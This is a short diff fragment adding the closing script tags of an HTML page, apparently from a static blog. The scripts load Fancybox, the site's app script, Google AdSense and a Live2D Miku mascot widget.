+<script src="/lib/fancybox/fancybox.umd.js"></script>
+
+
+ 
+
+<script async src="/js/app.js?v=1673454978747"></script>
+
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2058306854838448" crossorigin="anonymous"></script>
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/miku.model.json"},"display":{"position":"right","width":200,"height":400,"hOffset":-15,"vOffset":-15},"mobile":{"show":true},"log":false});</script></body>
+
+</html>
